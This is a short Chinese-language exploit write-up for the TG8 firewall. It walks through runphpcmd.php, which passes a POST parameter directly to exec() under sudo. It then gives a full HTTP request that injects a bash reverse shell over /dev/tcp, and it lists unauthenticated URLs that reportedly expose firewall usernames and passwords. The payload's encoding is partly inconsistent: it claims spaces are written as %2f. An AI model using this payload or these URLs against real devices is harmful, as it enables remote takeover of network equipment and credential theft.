#漏洞描述

TG8 Firewall RCE 和 信息泄露

#漏洞影响

TG8防火墙

#代码审计

该漏洞原因为在index.php文件中调用了runphpcmd.php，其中一行代码为
```
'sudo /home/TG8/v3/syscmd/check_gui_login.sh ' + username + ' ' + pass;
```
从以上可以看到以sudo来调用cmd，显然这里我们可以进行替换，进行任意命令执行。但是我们还有看一下runphpcmd.php里面是否有对其的限制和过滤，runphpcmd.php源码为：
```
function checkLogin() {
var username = $('input[name=u]').val();
var pass = $('input[name=p]').val();
var cmd = 'sudo /home/TG8/v3/syscmd/check_gui_login.sh ' + username + ' ' + pass;
    $.ajax({
url: "runphpcmd.php",
type: "post",
dataType: "json",
cache: "false",
data: {
syscmd: cmd
      },
success: function (x) {
if (x == 'OK') {
          ok(username);
        } else {
          failed();
        }
      },
error: function () {
      ok(username);
// alert("failure to excute the command");
      }
    })
  }
```
从以上源码可以看出来，并没有对syscmd的内容进行验证，结果直接就以json格式返回给调用者。
```
<?php
  header('Content-Type: application/json');
  $response= array();
  $output= array();
  $cmd_1 = $_POST['syscmd'];
  $data = 'cmd= '.$cmd_1."\n";
  $fp = fopen('/opt/phpJS.log', 'a');
  fwrite($fp, $data);
  exec($cmd_1,$output,$ret);
  $data = ' output ='. json_encode($output)."\n*******************************************************\n";
  $fp = fopen('/opt/phpJS.log', 'a');
  fwrite($fp, $data);
  $response[] = array("result" => $output);
// Encoding array in JSON format
echo json_encode($output);
?>
```
所以我们就可以构造payload了，如下：
```
POST /admin/runphpcmd.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Connection: keep-alive
syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bbash%2F-i%2F>&%2F/dev/tcp/127.0.0.1/10086%2F0>&1%3B++local
```
空格用%2f替换，‘;’用%3B替换

##2、信息泄露
任何用户都可以通过访问以下url路径来枚举防火墙的用户和密码信息。
```
http://127.0.0.1/data/w-341.tg
http://127.0.0.1/data/w-342.tg
http://127.0.0.1/data/r-341.tg
http://127.0.0.1/data/r-342.tg
```